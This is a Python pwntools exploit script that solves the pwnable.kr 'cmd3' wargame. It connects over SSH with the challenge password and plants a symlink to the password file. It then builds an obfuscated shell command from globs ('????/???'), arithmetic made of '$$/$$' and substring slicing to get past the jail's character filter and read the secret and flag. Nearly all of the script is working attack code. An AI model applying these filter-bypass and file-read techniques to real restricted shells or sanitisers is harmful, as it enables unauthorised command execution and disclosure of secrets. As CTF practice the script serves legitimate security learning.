#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass FuN_w1th_5h3ll_v4riabl3s_haha --user cmd3 --path ./cmd3.py
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = 'cmd3.py'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'cmd3'
password = args.PASSWORD or 'FuN_w1th_5h3ll_v4riabl3s_haha'
remote_path = './cmd3.py'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.remote("127.0.0.1", 9023)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def do_cmd(io: tube, cmd: bytes) -> bytes:
    io.sendline(cmd)
    return io.recvuntil(b"cmd3$ ", drop=True)

num_underscores = 1
def variable() -> str:
    global num_underscores
    num_underscores += 1
    return "_" * num_underscores

def define(name: str, value: str) -> str:
    return f"{name}={value}"

def number(num: int) -> str:
    one = "$$/$$"
    return f"(({'+'.join([one] * num)}))"

def join(commands: list[str]) -> str:
    return ";".join(commands)

def slice_(value: str, from_: str, length: str | None = None) -> str:
    if length is None:
        return f"${{{value}:{from_}}}"
    else:
        return f"${{{value}:{from_}:{length}}}"

def eval_identifier(identifier: str) -> str:
    return f"${identifier}"

def exec_(expr: str) -> str:
    return f"$({expr})"

TMP_FILENAME = "/tmp/________/lnk"
TMP_FILENAME_GLOB = "/???/________/???"
TMP_DIRNAME = os.path.dirname(TMP_FILENAME)

JAIL_CAT_GLOB = '(????/???)'
JAIL_ID_JAIL_LS_GLOB = '(????/??)'

JAIL_CAT = variable()
CAT = variable()
JAIL_ID_JAIL_LS = variable()
ID = variable()
SPACE = variable()

commands = [
    define(JAIL_CAT, JAIL_CAT_GLOB),                                          # JAIL_CAT=????/??=jail/cat
    define(CAT, slice_(JAIL_CAT, number(len("jail/")))),                      # CAT=${JAIL_CAT:5}=cat
    define(JAIL_ID_JAIL_LS, JAIL_ID_JAIL_LS_GLOB),                            # JAIL_ID_JAIL_LS=(????/??)=(jail/id jail/ls)
    define(ID, exec_(slice_(JAIL_ID_JAIL_LS, number(len("jail/"))))),         # ID=$(${JAIL_ID_JAIL_LS:5})=$(id)=uid=1068(cmd3_pwn) ...
    define(SPACE, slice_(ID, number(len("uid=1068(cmd3_pwn)")), number(1))),  # SPACE=${ID:...:1}=' '
    f"{eval_identifier(CAT)}{eval_identifier(SPACE)}{TMP_FILENAME_GLOB}"      # cat ...=$CAT$SPACE/???/________/???=cat /tmp/________/lnk
]

cmd = join(commands)

io = start()

# get password path
io.recvuntil(b"your password is in ")
password_path = os.path.join(b"/home/cmd3_pwn", io.recvline(keepends=False))
io.recvuntil(b"cmd3$ ")

# prepare symlink (/tmp/________/lnk)
shell.rm(b"-rf", TMP_DIRNAME.encode())
shell.mkdir(TMP_DIRNAME.encode())
shell.ln(b"-s", password_path, TMP_FILENAME.encode())

password = do_cmd(io, cmd.encode())

success(f"got password: {password.decode()}")

io.sendline(password)
io.recvuntil(b"Congratz! here is flag : ")
flag = io.recvline(keepends=False)

success(f"flag = '{term.text.bold_italic_yellow(flag.decode().strip())}'")